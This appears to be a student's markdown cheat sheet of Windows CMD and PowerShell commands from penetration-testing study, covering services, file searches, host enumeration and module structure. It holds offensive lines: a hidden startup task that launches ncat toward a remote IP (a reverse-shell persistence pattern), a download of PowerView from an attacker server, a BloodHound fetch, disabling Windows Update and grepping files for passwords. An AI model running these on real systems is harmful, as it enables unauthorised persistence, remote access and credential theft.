# CMD Commands

## Handling Services
sc start<br>
sc stop<br>
sc config wuauserv start= disabled<br>

## Listing Services
tasklist /svc<br>
net stat<br>

## Finding Files
where.exe /R C:\Users\student\ bio.txt<br>
find "password" "C:\Users\student\not-passwords.txt"<br>
comp .\file-1.md .\file-2.md<br>
fc passwords.txt modded.txt /N<br>

## Gathering Infos 

systeminfo<br>
hostname<br>
ver<br>
ipconfig<br>
arp /a<br>
whoami<br>
whoami /priv<br>
whoami /groups<br>
net user -> All users on a Host<br>
net group -> All groups on a Host<br>
net share  <br>
net view -> domain resources, shares, printers, and more.<br>

## Scheduled Tasks

schtasks /Query /V /FO list -> Lists active tasks<br>
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"<br>

## Webrequests 
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent<br>
Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"<br>
(New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")<br>

## Module Components
- A directory containing all the required files and content, saved somewhere within `$env:PSModulePath`.  
  - This is done so that when you attempt to import it into your PowerShell session or Profile, it can be automatically found instead of having to specify the path.  

- A manifest file listing all files and pertinent information about the module and its function.  
  - This could include associated scripts, dependencies, the author, example usage, etc.  

- A code file – usually either a PowerShell script (`.ps1`) or a module file (`.psm1`) that contains the script functions and other information.  

- Other resources the module needs, such as help files, scripts, and other supporting documents.  

